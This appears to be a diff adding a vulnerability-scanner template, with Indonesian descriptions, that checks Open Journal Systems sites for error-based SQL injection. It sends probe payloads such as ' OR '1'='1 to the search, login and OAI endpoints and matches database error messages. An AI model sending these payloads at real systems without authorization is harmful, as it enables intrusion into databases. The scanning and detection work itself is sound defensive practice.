@@ -1,0 +1,95 @@
+id: ojs-sqli-detection
+
+info:
+  name: OJS SQL Injection Detection
+  author: OJS-Security-Scanner
+  severity: high
+  description: |
+    Deteksi SQL injection pada endpoint publik OJS.
+    Menggunakan error-based detection untuk mendeteksi respon MySQL error
+    pada form login, endpoint pencarian, dan parameter OAI.
+  tags:
+    - ojs
+    - sqli
+    - injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+    cve-id: CVE-2019-17648
+
+http:
+  # Test 1: SQLi di parameter query pencarian
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/search/search?query=%27+OR+%271%27%3D%271"
+      - "{{BaseURL}}/index.php/index/search/search?query=%22+OR+1%3D1--"
+      - "{{BaseURL}}/index.php/index/search/search?query=1%27"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "You have an error in your SQL"
+          - "Warning: mysql"
+          - "ORA-01756"
+          - "pg_query()"
+          - "SQLite3::query"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 500
+
+    extractors:
+      - type: regex
+        name: sql_error
+        regex:
+          - "(?i)(SQL syntax[^\"]+|mysql_fetch[^\"]+|Warning: mysql[^\"]+)"
+        internal: false
+
+  # Test 2: SQLi di form login (username field)
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/login/signIn"
+
+    body: "username=%27+OR+%271%27%3D%271&password=wrongpassword"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "You have an error in your SQL"
+          - "Warning: mysql"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 500
+
+  # Test 3: SQLi di OAI parameter (identifier)
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/oai?verb=GetRecord&identifier=%27&metadataPrefix=oai_dc"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "You have an error"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 500
